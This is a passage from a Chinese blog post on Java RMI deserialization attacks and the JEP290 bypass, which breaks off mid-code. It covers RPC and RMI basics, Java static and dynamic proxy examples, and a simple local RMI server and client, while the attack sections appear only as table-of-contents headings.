<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>
        Threezh1&#39;Blog
    </title>
    
<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">

    
<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body id="bodyx">
    <div class="hd posts">
    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
    <div class="post-title">
        <p>
            JAVA RMI 反序列化攻击 &amp; JEP290 Bypass分析
        </p>
        <hr>
    </div>
    <div class="post-content">
        <div class="post-date">
            <p> December 19th 2020, 9:59:35 pm &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
        </div>
        <!--Table of Contents begin-->
        
            <div id="toc" class="toc-article">
            <strong class="toc-title">目录</strong>
            <a class="js-toggle-toc" href="javascript:void(0)"></a>
            <div class="toc-content">
                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B4%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-text">说在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI-%E5%9F%BA%E7%A1%80"><span class="toc-text">RMI 基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RPC"><span class="toc-text">RPC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JAVA-%E4%BB%A3%E7%90%86"><span class="toc-text">JAVA 代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JAVA-RMI"><span class="toc-text">JAVA RMI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JRMP"><span class="toc-text">JRMP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">RMI源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Server%E7%AB%AF%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83-Registry"><span class="toc-text">Server端注册中心(Registry)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LocateRegistry-createRegistry"><span class="toc-text">LocateRegistry.createRegistry</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LocateRegistry-getRegistry"><span class="toc-text">LocateRegistry.getRegistry</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Client%E7%AB%AF%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">Client端调用方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB"><span class="toc-text">RMI 反序列化攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%B8%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-text">一、服务端与客户端攻击注册中心</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bind-amp-rebind"><span class="toc-text">bind() &amp; rebind()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unbind-amp-lookup"><span class="toc-text">unbind &amp; lookup</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8E%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-text">二、注册中心攻击客户端与服务端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-text">三、客户端攻击服务端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-text">四、服务端攻击客户端</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JEP290"><span class="toc-text">JEP290</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFJEP290%EF%BC%9F"><span class="toc-text">什么是JEP290？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-JEP290"><span class="toc-text">Bypass JEP290</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Registry%E9%80%9A%E8%BF%87setObjectInputFilter%E6%9D%A5%E8%AE%BE%E7%BD%AEfilter%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-text">Registry通过setObjectInputFilter来设置filter过程分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass-%E5%A4%8D%E7%8E%B0"><span class="toc-text">Bypass 复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UnicastRef-Bypass-JEP290-%E5%88%86%E6%9E%90-jdk-lt-8u231"><span class="toc-text">UnicastRef Bypass JEP290 分析 (jdk&lt;&#x3D;8u231)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass-JEP290-jdk-8u231"><span class="toc-text">Bypass JEP290 (jdk&#x3D;8u231)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
            </div>
            </div>
        
        <!--Table of Contents end -->
        <h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>入门了反序列化之后对RMI、JNDI、LDAP、JRMP、JMX、JMS这些都不了解，所以打算一个问题一个问题的解决它们，这这篇专注于RMI的学习，从RPC到RMI的反序列化再到JEP290都过了一遍。参考了很多很多师傅的文章，如果有写的不对的地方还望师傅们不吝赐教。</p>
<h2 id="RMI-基础"><a href="#RMI-基础" class="headerlink" title="RMI 基础"></a>RMI 基础</h2><h3 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h3><p>RPC（Remote Procedure Call）远程过程调用，就是要像调用本地的函数一样去调远程函数。它并不是某一个具体的框架，而是实现了远程过程调用的都可以称之为RPC。比如RMI(Remote Method Invoke 远程方法调用)就是一个实现了RPC的JAVA框架。</p>
<p>RPC的演化过程可以看这个视频进行了解：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1zE41147Zq">https://www.bilibili.com/video/BV1zE41147Zq</a></p>
<p>对于视频里面实现RPC的方式我画了一个简单的流程图来理解：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/wei-ming-ming-wen-jian-1.jpg" alt="未命名文件 -1-"></p>
<p>Client如果想要远程调用一个方法，就需要通过一个Stub类传递类名、方法名与参数信息给Server端，Server端获取到这些信息后会从本地服务器注册表中找到具体的类，再通过反射获取到一个具体的方法并执行然后返回结果。</p>
<h3 id="JAVA-代理"><a href="#JAVA-代理" class="headerlink" title="JAVA 代理"></a>JAVA 代理</h3><p><strong>代理模式</strong></p>
<p>代理模式是一种设计模式，提供了对目标对象额外的访问方式，即通过代理对象访问目标对象，这样可以在不修改原目标对象的前提下，提供额外的功能操作，扩展目标对象的功能。</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16077614745070.jpg"></p>
<p><code>Proxy</code>在<code>Client</code>直接调用<code>DoAction()</code>中间加了一层处理，正是这层处理扩展了对象的功能。</p>
<p><strong>静态代理</strong></p>
<p>这种代理方式需要代理对象和目标对象实现一样的接口。</p>
<p>例子如下：</p>
<ul>
<li>接口类：IUserDao.java</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> proxy1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IUserDao</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>目标对象：UserDao.java</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> proxy1;</span><br><span class="line"><span class="comment">// 实现IUserDao接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserDao</span> <span class="keyword">implements</span> <span class="title">IUserDao</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;保存数据&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>静态代理对象：UserDapProxy.java</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> proxy1;</span><br><span class="line"><span class="comment">// 也需要实现IUserDao接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserDapProxy</span> <span class="keyword">implements</span> <span class="title">IUserDao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> IUserDao target;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserDapProxy</span><span class="params">(IUserDao target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> </span>&#123; <span class="comment">// 重写方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;doSomething before&quot;</span>); <span class="comment">// 执行前可以加的操作</span></span><br><span class="line">        target.save(); <span class="comment">// 实际上需要调用的方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;doSomething after&quot;</span>); <span class="comment">// 执行后可以加的操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>测试类：TestProxy.java</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> proxy1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestProxy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 目标对象</span></span><br><span class="line">        IUserDao target = <span class="keyword">new</span> UserDao();</span><br><span class="line">        <span class="comment">// 代理对象</span></span><br><span class="line">        UserDapProxy proxy = <span class="keyword">new</span> UserDapProxy(target);</span><br><span class="line">        <span class="comment">// 通过代理调用方法</span></span><br><span class="line">        proxy.save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16077611967206.jpg" alt="-w900"></p>
<p>可以看到，在不修改原来对象功能的前提下，在调用方法前后增加了功能。但是这种代理模式有很一些缺点：</p>
<ol>
<li>冗余。由于代理对象要实现与目标对象一致的接口，会产生过多的代理类。</li>
<li>不易维护。一旦接口增加方法，目标对象与代理对象都要进行修改。</li>
</ol>
<p><strong>动态代理</strong></p>
<p>动态代理利用JAVA中的反射，动态地在内存中构建代理对象，从而实现对目标对象的代理功能。动态代理又被称为JDK代理或接口代理。动态代理对象不需要实现接口，但是要求目标对象必须实现接口，否则不能使用动态代理。</p>
<ul>
<li>动态代理对象：UserProxyFactory.java</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> proxy1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserProxyFactory</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserProxyFactory</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getProxyInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 返回一个指定接口的代理类实例，该接口可以将方法调用指派到指定的调用处理程序。</span></span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(</span><br><span class="line">                target.getClass().getClassLoader(), <span class="comment">// 指定当前目标对象使用类加载器</span></span><br><span class="line">                target.getClass().getInterfaces(), <span class="comment">// 目标对象实现的接口的类型</span></span><br><span class="line">                <span class="keyword">new</span> InvocationHandler() &#123; <span class="comment">// 事件处理器</span></span><br><span class="line">                    <span class="meta">@Override</span> <span class="comment">// 重写InvocationHandler累类的invoke方法，通过反射调用方法</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;doSomething before&quot;</span>);</span><br><span class="line">                        Object returnValue = method.invoke(target, args);</span><br><span class="line">                        System.out.println(<span class="string">&quot;doSomething after&quot;</span>);</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>测试类：TestDynamicProxy.java</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> proxy1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestDynamicProxy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        IUserDao taget = <span class="keyword">new</span> UserDao();</span><br><span class="line">        System.out.println(taget.getClass()); <span class="comment">// 获取目标对象信息</span></span><br><span class="line">        IUserDao proxy = (IUserDao) <span class="keyword">new</span> UserProxyFactory(taget).getProxyInstance(); <span class="comment">// 获取代理类 </span></span><br><span class="line">        System.out.println(proxy.getClass()); <span class="comment">// 获取代理对象信息</span></span><br><span class="line">        proxy.save(); <span class="comment">// 执行代理方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16077631077684.jpg" alt="-w1792"></p>
<p><strong>参考文章</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Dt41187wj">十分钟了解java动态代理</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_33778778/article/details/87999148">10分钟看懂动态代理设计模式</a></li>
<li><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000011291179">Java三种代理模式：静态代理、动态代理和cglib代理</a></li>
</ul>
<h3 id="JAVA-RMI"><a href="#JAVA-RMI" class="headerlink" title="JAVA RMI"></a>JAVA RMI</h3><p>定义：</p>
<blockquote>
<p>RMI（Remote Method Invocation）为远程方法调用，是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。</p>
</blockquote>
<blockquote>
<p>Java RMI：Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</p>
</blockquote>
<p>JAVA中RMI的简单例子：</p>
<p><strong>Server端</strong></p>
<p>定义一个远程接口：User.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> eval_rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">name</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">(String say)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dowork</span><span class="params">(Object work)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>在Java中，只要一个类extends了java.rmi.Remote接口，即可成为存在于服务器端的远程对象。其他接口中的方法若是声明抛出了RemoteException异常，则表明该方法可被客户端远程访问调用。</p>
<blockquote>
<p>JavaDoc描述：Remote 接口用于标识其方法可以从非本地虚拟机上调用的接口。任何远程对象都必须直接或间接实现此接口。只有在“远程接口” （扩展 java.rmi.Remote 的接口）中指定的这些方法才可被远程调用。</p>
</blockquote>
<p>远程接口实现类：UserImpl.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> eval_rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="comment">// java.rmi.server.UnicastRemoteObject构造函数中将生成stub和skeleton</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="comment">// 必须有一个显式的构造函数，并且要抛出一个RemoteException异常</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">name</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">(String say)</span> <span class="keyword">throws</span>  RemoteException</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;you speak&quot;</span> + say);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dowork</span><span class="params">(Object work)</span> <span class="keyword">throws</span>  RemoteException</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;your work is &quot;</span> + work);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>远程对象必须继承java.rmi.server.UniCastRemoteObject类，这样才能保证客户端访问获得远程对象时，该远程对象将会把自身的一个拷贝以Socket的形式传输给客户端，此时客户端所获得的这个拷贝称为“存根”，而服务器端本身已存在的远程对象则称之为“骨架”。其实此时的存根是客户端的一个代理（Stub），用于与服务器端的通信，而骨架也可认为是服务器端的一个代理（skeleton），用于接收客户端的请求之后调用远程方法来响应客户端的请求。</p>
<p>这个Stub和RPC同理，Skeleton可以理解为是服务端的Stub。</p>
<p>服务端实现类：UserServer.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> eval_rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">&quot;rmi://127.0.0.1:3333/User&quot;</span>;</span><br><span class="line">        User user = <span class="keyword">new</span> UserImpl(); <span class="comment">// 生成stub和skeleton,并返回stub代理引用</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">3333</span>); <span class="comment">// 本地创建并启动RMI Service，被创建的Registry服务将在指定的端口上监听并接受请求</span></span><br><span class="line">        Naming.bind(url, user); <span class="comment">// 将stub代理绑定到Registry服务的URL上</span></span><br><span class="line">        System.out.println(<span class="string">&quot;the rmi is running : &quot;</span> + url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个类的作用就是注册远程对象,向客户端提供远程对象服务。将远程对象注册到RMI Service之后，客户端就可以通过RMI Service请求到该远程服务对象的stub了，利用stub代理就可以访问远程服务对象了。</p>
<p>Naming类的介绍：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;** Naming 类提供在对象注册表中存储和获得远程对远程对象引用的方法 </span><br><span class="line"> *  Naming 类的每个方法都可将某个名称作为其一个参数， </span><br><span class="line"> *  该名称是使用以下形式的 URL 格式（没有 scheme 组件）的 java.lang.String: </span><br><span class="line"> *  &#x2F;&#x2F;host:port&#x2F;name </span><br><span class="line"> *  host：注册表所在的主机（远程或本地)，省略则默认为本地主机 </span><br><span class="line"> *  port：是注册表接受调用的端口号，省略则默认为1099，RMI注册表registry使用的著名端口 </span><br><span class="line"> *  name：是未经注册表解释的简单字符串 </span><br><span class="line"> *&#x2F;  </span><br><span class="line">&#x2F;&#x2F;Naming.bind(&quot;&#x2F;&#x2F;host:port&#x2F;name&quot;, h);</span><br></pre></td></tr></table></figure>

<p><strong>Client端</strong></p>
<p>UserClient.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> eval_rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">&quot;rmi://127.0.0.1:3333/User&quot;</span>;</span><br><span class="line">        User userClient = (User)Naming.lookup(url); <span class="comment">// 从RMI Registry中请求stub</span></span><br><span class="line">        System.out.println(userClient.name(<span class="string">&quot;test&quot;</span>)); <span class="comment">// 通过stub调用远程接口实现</span></span><br><span class="line">        userClient.say(<span class="string">&quot;world&quot;</span>); <span class="comment">// 在客户端中调用，在服务端输出</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>RMI测试</strong></p>
<p>先启动<code>UserServer.java</code>，再启动<code>UserClient.java</code>：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16077559081155.jpg" alt="-w900"></p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16077559354790.jpg" alt="-w900"></p>
<p>同时在服务端：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16077558726495.jpg" alt="-w900"></p>
<p><strong>直接使用Registry实现的RMI</strong></p>
<p>除了使用Naming的方式注册RMI之外，还可以直接使用Registry实现。代码如下：</p>
<p>Server端：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> eval_rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> 